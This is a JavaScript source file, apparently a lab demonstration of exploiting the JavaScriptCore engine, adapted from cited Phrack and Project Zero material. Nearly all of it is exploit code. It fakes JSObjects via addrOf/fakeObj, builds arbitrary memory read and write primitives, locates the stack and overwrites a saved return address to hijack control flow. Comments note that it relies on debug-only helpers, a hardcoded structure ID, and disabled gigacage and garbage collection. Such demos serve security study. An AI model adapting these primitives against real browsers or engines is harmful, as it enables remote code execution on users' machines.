// Disable ASLR:
// setarch `uname -m` -R /bin/bash
// Dump stuff:
// python3 Tools/Scripts/dump-class-layout -t WebKitBuild/JSCOnly/Debug/lib/libJavaScriptCore.so JavaScriptCore JSC::JITCode

const verbose = true
let output = true

// -------------------------------------------------------------------------

function addrOf(o, doOutput = true) {
    return $vm.addrOf(o, verbose && output && doOutput && false)
}

function fakeObj(o) {
    return $vm.fakeObj(o, verbose && output && false)
}

// -------------------------------------------------------------------------

// Based off the following sources:
// http://www.phrack.org/issues/70/3.html
// Also read:
// https://saelo.github.io/presentations/offensivecon_22_attacking_javascript_engines.pdf
// StructureID randomization + pac bypass:
// https://googleprojectzero.blogspot.com/2020/09/jitsploitation-two.html
// See SKIP * comments to see where we are taking shortcuts.

let read64 = null
let write64 = null

// Adapted from phrack

// Return the hexadecimal representation of the given byte.
function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();

function fromBytes(bytes) {
    return BigInt('0x' + hexlify(Array.from(bytes).reverse()))
}

function asBytes(v) {
    let bytes = new Uint8Array(8)

    if (typeof v == 'object')
        v = fromBytes(v)
    if (typeof v == 'bigint')
        v = v.toString(16)
    if (typeof v == 'number')
        v = '0x' + Math.floor(v).toString(16);
    if (typeof v == 'string') {
        v = v.toString(16)
        if (v.startsWith('0x'))
            v = v.substr(2);
        if (v.length % 2 == 1)
            v = '0' + v;

        var bigEndian = unhexlify(v, 8)
        bytes.set(Array.from(bigEndian).reverse());
    } else
        throw "Invalid input: " + v
    return bytes
}

function asDouble(v) {
    let bytes = asBytes(v)
    p("AsDouble: " + typeof(v) + " " + v + " is " + bytes)
    // Check for NaN
    if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
        throw new RangeError("Integer can not be represented by a double");

    return Struct.unpack(Struct.float64, bytes);
}

{
    // Create the array that will be used to read and write arbitrary memory addresses.
    // Below, we will make a object who's butterfly will point directly here.
    // The indexing header will point to just before this
    var hax = new Uint8Array(0x2000);

    p("Hax original:")
    $vm.dumpCell(hax)

    let example = []
    for (let i = 0; i < 100; ++i)
        example[i] = 20.0
    p("Example object")
    $vm.dumpCell(example)

    // Create fake JSObject.
    p("[*] Setting up container object");

    /*
    Example object
    [0] 0x7fffe6009248 : 0x0108240700006240 header
        structureID 25152 0x6240 structure 0x7ffe00006240
        indexingTypeAndMisc 7 0x7 ArrayWithDouble
        type 36 0x24
        flags 8 0x8
        cellState 1
    [1] 0x7fffe6009250 : 0x00007fffe4468b18 butterfly
        base 0x7fffe4468b10
        hasIndexingHeader YES hasAnyArrayStorage NO
        publicLength 100 vectorLength 153
        preCapacity 0 propertyCapacity 0
        <--- indexingHeader
        [0] 0x7fffe4468b10 : 0x0000009900000064
        <--- butterfly

    (lldb) p JSC::JSValue::decode(0x0108240700006240).asDouble()
    (double) $0 = 1.0089395764122653E-303

    */

    var container = {
        jsCellHeader: asDouble(0x010824070052d8a0), // SKIP 1: See article about how to make structure id oracle.
        butterfly: fakeObj(addrOf(hax) + 4n),
        vector: false,
        lengthAndFlags: false
    };

    $vm.dumpCell(container)

    p('---')

    var address = addrOf(container) + 16n
    p("[*] Fake JSObject @ " + address);

    var fakearray = fakeObj(address);

    p('Fake array now looks like: ')
    $vm.dumpCell(fakearray)
    p('----')

    // -----
    // SKIP 1: See the article above on how to bypass structure id randomization.
    // For this demo, just pick a good structure id, the below oracle doesn't work
    // -----

    // From now on until we've set the butterfly pointer to a sane value (i.e. nullptr)
    // a GC run would crash the process. We just disabled GC for this demo, but normally
    // you would need to be careful.

    // SKIP 1: Replace with oracle
    if (!(fakearray instanceof Object)) {
        p("Bad structure ID, update it")
        $vm.crash()
    }

    //
    // We now have a limited read-write primitive that can only read/write valid doubles.
    // SKIP 2: see article about gigacage bypass, we just disabled it.
    //

    // Example of limited R/W:
    p("Example of how setting the array backing store works")
    p("Hax before: ")
    $vm.dumpCell(hax)
    p("Fake array before")
    $vm.dumpCell(fakearray)

    /*
        (lldb) p JSC::JSValue::decode(0xDEADDEADDEADDEADll).asDouble()
        (double) $4 = -1.1136337192107337E+148
    */
    fakearray[1] = asDouble('0xDEADDEADDEADDEAD')

    p("Fake array after")
    $vm.dumpCell(fakearray)
    p("Hax after, notice the vector() pointer: ")
    $vm.dumpCell(hax)
    p("----------")

    memory = {
        read: function(addr, length) {
            if (verbose)
                p("[<] Reading " + length + " bytes from " + addr + " which is encoded as " + asDouble(addr))
            fakearray[1] = asDouble(addr)
            // $vm.dumpCell(hax)
            let arr = []
            for (var i = 0; i < length; i++)
                arr[i] = hax[i];
            return arr
        },

        readInt64: function(addr) {
            return fromBytes(this.read(addr, 8));
        },

        write: function(addr, data) {
            if (verbose)
                p("[>] Writing " + data.length + " bytes to " + addr);
            fakearray[1] = asDouble(addr);
            for (var i = 0; i < data.length; i++)
                hax[i] = data[i];
        },

        writeInt64: function(addr, val) {
            return this.write(addr, asBytes(val));
        }
    };

    // SKIP 3: Normally here we would do some cleanup to ensure that the GC doesn't crash stuff
    // We just disabled GC instead.

    read64 = function (addr) {
        return memory.readInt64(addr)
    }
    
    write64 = function (addr, val) {
        return memory.writeInt64(addr, val)
    }
}

// -------------------------------------------------------------------------

p("Done!")

// -------------------------------------------------------------------------

const verboseDeref = true

function p(s) {
    if (!output)
        return
    print(s)
}
function hd(i) { p("0x" + i.toString(16)) }

function inspectCell(c) {
    $vm.dumpCell(c)
}

function tierUp(o) {
    for (let i = 0; i < 1000000; ++i)
        o()
}

const offsetMap = new Map([
    ["JSFunction::executableOrRareData", 20n],
    ["FunctionExecutable::m_unlinkedExecutable", 60n],
    ["ExecutableBase::m_jitCodeForCall", 8n],
    ["JITCode::executableAddress", 20n],
    ["JSGlobalObject::m_vm", 44n],
    ["VM::topEntryFrame", 36n],
    ["JSGlobalProxy::m_target", 16n],
])
function offset(field) {
    if (!offsetMap.has(field))
        throw field
    return offsetMap.get(field)
}

function deref(o, field) {
    let orig = field
    if (field.includes(".")) {
        let s = field.split(".")
        field = s.pop()
        o = fakeObj(deref(o, s.join(".")))
    }

    let value = read64(addrOf(o, false) + offset(field))

    if (verboseDeref)
        p(orig + " -> 0x" + value.toString(16))
    return value
}

function derefAssign(o, field, val) {
    let orig = field
    if (field.includes(".")) {
        let s = field.split(".")
        field = s.pop()
        o = fakeObj(deref(o, s.join(".")))
    }

    output = false
    let value = read64(addrOf(o, false) + offset(field))
    write64(addrOf(o) + offset(field), val)
    let newVal = read64(addrOf(o, false) + offset(field))
    output = true;

    if (verboseDeref)
        p(orig + " : 0x" + value.toString(16) + " -> 0x" + newVal.toString(16))
    return value
}

// -------------------------------------------------------------------------

//if (verbose)
//    $vm.dumpRegisters()

let stack = deref(globalThis, "JSGlobalProxy::m_target.JSGlobalObject::m_vm.VM::topEntryFrame")
p("A stack address:")
hd(stack)

p("---")

function findReturnAddress(a, b, c, d, e, f, g, h, i, j, k, l) {
    if (verbose)
        $vm.dumpRegisters()

    let myStack = 0
    let fail = 0
    for (let i = stack; ; i -= 8n) {
        output = false
        let a = read64(i)
        let b = read64(i + 8n)
        output = true

        if (a == 0xffffffff000000bfn && b == 0xffffffff000000efn) {
            myStack = i
            break
        }
        
        ++fail
        if (fail > 1000)
            throw "Failed to find stack"
    }

    p("Found my stack: ")
    hd(myStack)

    p("Found ret pc at:")
    let retPC = myStack - 0xb31fff30n + 0xb31fff10n
    hd(retPC)
    hd(read64(retPC))

    write64(retPC, 0xBFBF691137n)
}

findReturnAddress(0xBF, 0xEF)

